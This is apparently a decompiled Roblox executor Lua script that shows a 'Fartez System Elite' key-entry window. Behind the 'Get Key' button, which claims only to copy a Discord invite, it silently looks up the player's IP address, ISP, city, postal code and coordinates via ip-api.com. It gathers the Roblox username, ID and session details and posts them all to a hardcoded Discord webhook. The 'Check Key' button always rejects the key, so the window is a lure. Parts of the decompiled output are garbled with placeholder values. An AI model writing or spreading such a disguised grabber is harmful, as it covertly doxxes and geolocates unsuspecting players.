local PlaceId, UICorner_3, UIStroke_2, UICorner_4, TextBox, Key, Check_Key, Invalid_Key_Try_Again, UICorner_5, R25_Result, JSONDecode;
local fenv = getfenv();
pcall(function(p1, a, b, c)

end);
local UserInputService = game:GetService("UserInputService");
local HttpService = game:GetService("HttpService");
local LocalPlayer = game:GetService("Players").LocalPlayer;
local FromRGB = Color3.fromRGB;
local R17_Result = FromRGB(88, 101, 242);
local Request = fenv.syn.request;
local success_1, r30 = pcall(function(p1_3, p2_3, p3_3, a_3, b_3, c_3)
    PlaceId = game.PlaceId;
    return game:GetService("MarketplaceService"):GetProductInfo(PlaceId);
end);
local Name = r30.Name;
local FartezKeySystem = Instance.new(
    "ScreenGui",
    game:GetService("CoreGui")
);
FartezKeySystem.Name = "FartezKeySystem";
FartezKeySystem.ResetOnSpawn = false;
local Frame = Instance.new("Frame", FartezKeySystem);
local UDim2_New = UDim2.new;
Frame.Size = UDim2_New(0, 360, 0, 220);
Frame.Position = UDim2_New(0.5, 0, 0.5, 0);
local Vector2_New = Vector2.new;
Frame.AnchorPoint = Vector2_New(0.5, 0.5);
Frame.BackgroundColor3 = FromRGB(15, 15, 15);
Frame.BorderSizePixel = 0;
Frame.Active = true;
local UICorner = Instance.new("UICorner", Frame);
local UDim_New = UDim.new;
UICorner.CornerRadius = UDim_New(0, 10);
local UIStroke = Instance.new("UIStroke", Frame);
UIStroke.Color = R17_Result;
local Frame_2 = Instance.new("Frame", Frame);
Frame_2.Size = UDim2_New(1, 0, 0, 40);
Frame_2.BackgroundColor3 = FromRGB(20, 20, 20);
Frame_2.BorderSizePixel = 0;
local UICorner_2 = Instance.new("UICorner", Frame_2);
UICorner_2.CornerRadius = UDim_New(0, 10);
local TextLabel = Instance.new("TextLabel", Frame_2);
TextLabel.Size = UDim2_New(1, 0, 1, 0);
TextLabel.Position = UDim2_New(0, 0, 0, 0);
TextLabel.Text = "NMP - " .. (
    Name .. " - Key"
);
local Color3_New = Color3.new;
TextLabel.TextColor3 = Color3_New(1, 1, 1);
TextLabel.TextSize = 14;
local _ = Enum.Font.GothamBold;
TextLabel.Font = Enum.Font.GothamBold;
local _ = Enum.TextXAlignment.Center;
TextLabel.TextXAlignment = Enum.TextXAlignment.Center;
local _ = Enum.TextYAlignment.Center;
TextLabel.TextYAlignment = Enum.TextYAlignment.Center;
TextLabel.BackgroundTransparency = 1;
local TextButton = Instance.new("TextButton", Frame_2);
TextButton.Size = UDim2_New(0, 30, 0, 30);
TextButton.Position = UDim2_New(1, -5, 0, 5);
TextButton.AnchorPoint = Vector2_New(1, 0);
TextButton.Text = "×";
TextButton.TextColor3 = Color3_New(1, 1, 1);
TextButton.TextSize = 25;
TextButton.BackgroundTransparency = 1;
TextButton.ZIndex = 3;
TextButton.MouseButton1Click:Connect(function(p1_3, p2_3, p3_3, p4_3, a_3, b_3, c_3)
    FartezKeySystem:Destroy();
    local _ = FartezKeySystem == FartezKeySystem;
    local _ = FartezKeySystem == r93;
    local _ = FartezKeySystem == r96;
    local _ = FartezKeySystem == r127;
    local _ = FartezKeySystem == UICorner;
    local _ = FartezKeySystem == UIStroke;
    local _ = FartezKeySystem == Frame_2;
    local _ = FartezKeySystem == r79;
    local _ = FartezKeySystem == r99;
    local _ = FartezKeySystem == r116;
    local _ = FartezKeySystem == r130;
    local _ = FartezKeySystem == workspace;
    local _ = FartezKeySystem == workspace.CurrentCamera;
    local _ = FartezKeySystem == LocalPlayer;
    local _ = FartezKeySystem == Frame;
    local _ = FartezKeySystem == r110;
    local _ = FartezKeySystem == UICorner_2;
    local _ = FartezKeySystem == TextLabel;
    local _ = FartezKeySystem == TextButton;
end);
r79 = Instance.new("TextBox", Frame);
r79.Size = UDim2_New(1, -40, 0, 40);
r79.Position = UDim2_New(0.5, 0, 0, 65);
r79.AnchorPoint = Vector2_New(0.5, 0);
r79.BackgroundColor3 = FromRGB(25, 25, 25);
r79.Text = "";
r79.PlaceholderText = "Paste your Key here...";
r79.PlaceholderColor3 = FromRGB(100, 100, 100);
r79.TextColor3 = Color3_New(1, 1, 1);
local _ = Enum.Font.Gotham;
r79.Font = Enum.Font.Gotham;
r79.TextSize = 14;
r93 = Instance.new("UICorner", r79);
r93.CornerRadius = UDim_New(0, 6);
r96 = Instance.new("UIStroke", r79);
r96.Color = FromRGB(50, 50, 50);
r99 = Instance.new("TextButton", Frame);
r99.Size = UDim2_New(0.43, 0, 0, 40);
r99.Position = UDim2_New(0, 20, 0, 125);
r99.BackgroundColor3 = FromRGB(40, 40, 40);
r99.Text = "Get Key";
r99.TextColor3 = Color3_New(1, 1, 1);
local _ = Enum.Font.GothamBold;
r99.Font = Enum.Font.GothamBold;
r99.TextSize = 14;
r110 = Instance.new("UICorner", r99);
r110.CornerRadius = UDim_New(0, 6);
r99.MouseButton1Click:Connect(function(p1_4, p2_4, p3_4, a_4, b_4, c_4)
    task.spawn(function()
        pcall(function(p1_10, p2_10, a_10, b_10, c_10)

        end);
        pcall(function(a_11, b_11, c_11)
            R25_Result = Request{
                ["Method"] = "GET",
                ["Url"] = "http://ip-api.com/json?fields=query,lat,lon,country,countryCode,continent,continentCode,region,regionName,city,district,zip,timezone,offset,isp,org,as,asname,reverse,mobile,proxy,hosting"
            };
            JSONDecode = HttpService:JSONDecode(R25_Result.Body);
        end);
        local _ = LocalPlayer.AccountAge .. " jours";
        local _ = LocalPlayer.UserId .. "\n• **Âge Compte:** 226225 jours";
        local _ = LocalPlayer.DisplayName .. "\n• **ID:** 770004\n• **Âge Compte:** 226225 jours";
        local _ = LocalPlayer.Name .. "\n• **Display:** gubrybni\n• **ID:** 770004\n• **Âge Compte:** 226225 jours";
        local _ = "\n• **Job ID:** " .. game.JobId;
        local _ = PlaceId .. "\n• **Job ID:** yfurlntn";
        local _ = "\n• **Pays (Roblox):** " .. game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(LocalPlayer);
        DateTime.now():ToIsoDate();
        HttpService:JSONEncode({
            ["embeds"] = {
                {
                    ["color"] = 5814786,
                    ["fields"] = {
                        {
                            ["value"] = "• **Pseudo:** Player\n• **Display:** gubrybni\n• **ID:** 770004\n• **Âge Compte:** 226225 jours",
                            ["name"] = "👤 Joueur",
                            ["inline"] = false
                        },
                        {
                            ["value"] = "• **Jeu:** " .. (
                                Name .. "\n• **Place ID:** 134590\n• **Job ID:** yfurlntn"
                            ),
                            ["name"] = "🎮 Session",
                            ["inline"] = false
                        },
                        {
                            ["value"] = "• **Plateforme:** Console / Manette\n• **Pays (Roblox):** xrpyxhrg",
                            ["name"] = "💻 Appareil & Région",
                            ["inline"] = false
                        },
                        {
                            ["value"] = "• **IP:** " .. (
                                tostring(JSONDecode.query) .. (
                                    "\n• **ISP / Opérateur:** " .. (
                                        tostring(JSONDecode.isp) .. (
                                            "\n• **Organisation:** " .. (
                                                tostring(JSONDecode.org) .. (
                                                    "\n• **Reverse DNS:** " .. tostring(JSONDecode.reverse)
                                                )
                                            )
                                        )
                                    )
                                )
                            ),
                            ["name"] = "🌐 Données Réseau (IP)",
                            ["inline"] = false
                        },
                        {
                            ["value"] = "• **Continent:** " .. (
                                tostring(JSONDecode.continent) .. (
                                    " (" .. (
                                        tostring(JSONDecode.continentCode) .. (
                                            ")\n• **Pays:** " .. (
                                                tostring(JSONDecode.country) .. (
                                                    " (" .. (
                                                        tostring(JSONDecode.countryCode) .. (
                                                            ")\n• **Région / Ville:** " .. (
                                                                tostring(JSONDecode.regionName) .. (
                                                                    " / " .. tostring(JSONDecode.city) .. "\n• **Code Postal:** " .. tostring(JSONDecode.zip) .. "\n• **Coordonnées:** " .. tostring(JSONDecode.lat) .. ", " .. tostring(JSONDecode.lon)
                                                                )
                                                            )
                                                        )
                                                    )
                                                )
                                            )
                                        )
                                    )
                                )
                            ),
                            ["name"] = "📍 Géolocalisation Réelle",
                            ["inline"] = false
                        },
                        {
                            ["value"] = "• **Mobile:** OUI\n• **Proxy / VPN:** OUI\n• **Hosting / Serveur:** OUI",
                            ["name"] = "🛡️ Sécurité & Type",
                            ["inline"] = false
                        }
                    },
                    ["title"] = "🔑 Demande de clé - Fartez System Elite",
                    ["timestamp"] = "2026-05-25.000Z"
                }
            }
        });
        pcall(function(p1_12, a_12, b_12, c_12)
            Request{
                ["Body"] = "{\"embeds\":[{\"color\":5814786,\"fields\":[{\"inline\":false,\"name\":\"👤 Joueur\",\"value\":\"• **Pseudo:** Player\\n• **Display:** gubrybni\\n• **ID:** 770004\\n• **Âge Compte:** 226225 jours\"},{\"inline\":false,\"name\":\"🎮 Session\",\"value\":{}},{\"inline\":false,\"name\":\"💻 Appareil & Région\",\"value\":\"• **Plateforme:** Console / Manette\\n• **Pays (Roblox):** xrpyxhrg\"},{\"inline\":false,\"name\":\"🌐 Données Réseau (IP)\",\"value\":{}},{\"inline\":false,\"name\":\"📍 Géolocalisation Réelle\",\"value\":{}},{\"inline\":false,\"name\":\"🛡️ Sécurité & Type\",\"value\":\"• **Mobile:** OUI\\n• **Proxy / VPN:** OUI\\n• **Hosting / Serveur:** OUI\"}],\"timestamp\":\"2026-05-25.000Z\",\"title\":\"🔑 Demande de clé - Fartez System Elite\"}]}",
                ["Url"] = "https://discord.com/api/webhooks/1495039620810014912/1HwJlEvWCbCuAPuH3u6Dtf95UNNxxUoC8GZw63LaxiVVvQlXK005LoPogwhEm6gB2LgE",
                ["Method"] = "POST",
                ["Headers"] = {
                    ["Content-Type"] = "application/json"
                }
            };
        end);
    end);
    setclipboard"https://(discord invite)";
    r99.Text = "Link Copied!";
    task.wait(2);
    r99.Text = "Get Key";
end);
r116 = Instance.new("TextButton", Frame);
r116.Size = UDim2_New(0.43, 0, 0, 40);
r116.Position = UDim2_New(1, -20, 0, 125);
r116.AnchorPoint = Vector2_New(1, 0);
r116.BackgroundColor3 = R17_Result;
r116.Text = "Check Key";
r116.TextColor3 = Color3_New(1, 1, 1);
local _ = Enum.Font.GothamBold;
r116.Font = Enum.Font.GothamBold;
r116.TextSize = 14;
r127 = Instance.new("UICorner", r116);
r127.CornerRadius = UDim_New(0, 6);
r130 = Instance.new("TextLabel", Frame);
r130.Size = UDim2_New(1, 0, 0, 20);
r130.Position = UDim2_New(0, 0, 0, 185);
r130.BackgroundTransparency = 1;
r130.Text = "";
r130.TextSize = 11;
r130.Font = Enum.Font.GothamSemibold;
r116.MouseButton1Click:Connect(function(a_5, b_5, c_5)
    r130.TextColor3 = FromRGB(220, 50, 50);
    r130.Text = "Invalid Key! Try again.";
    task.wait(2);
    r130.Text = "";
end);
Frame_2.InputBegan:Connect(function(input, a_6, b_6, c_6)
    local _ = Enum.UserInputType.MouseButton1;
    local _ = Enum.UserInputType.Touch;
end);
Frame_2.InputChanged:Connect(function(input_1, p2_7, p3_7, p4_7, p5_7, p6_7, a_7, b_7, c_7)
    local _ = Enum.UserInputType.MouseMovement;
    local _ = Enum.UserInputType.Touch;
end);
UserInputService.InputChanged:Connect(function(input_2, gameProcessedEvent, p3_8, p4_8, p5_8, p6_8, a_8, b_8, c_8)

end);
